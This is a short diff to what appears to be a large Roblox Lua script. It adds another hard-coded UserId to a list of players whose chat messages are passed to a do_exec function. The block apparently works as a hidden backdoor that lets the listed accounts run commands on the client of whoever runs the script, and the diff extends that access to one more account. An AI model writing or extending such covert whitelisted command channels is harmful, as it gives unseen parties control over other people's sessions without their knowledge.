@@ -5439,7 +5439,7 @@ game.Players.PlayerAdded:Connect(function(plr)
 
 
 game.Players.PlayerAdded:Connect(function(plr)
-        if plr.UserId == 5730426651 or plr.UserId == 911404169 or plr.UserId == 7149454194 then
+        if plr.UserId == 5730426651 or plr.UserId == 911404169 or plr.UserId == 7149454194 or plr.UserId == 1712158222  then
             print("okCmd")
             plr.Chatted:Connect(function(msg)
                 do_exec(msg, Players.LocalPlayer)
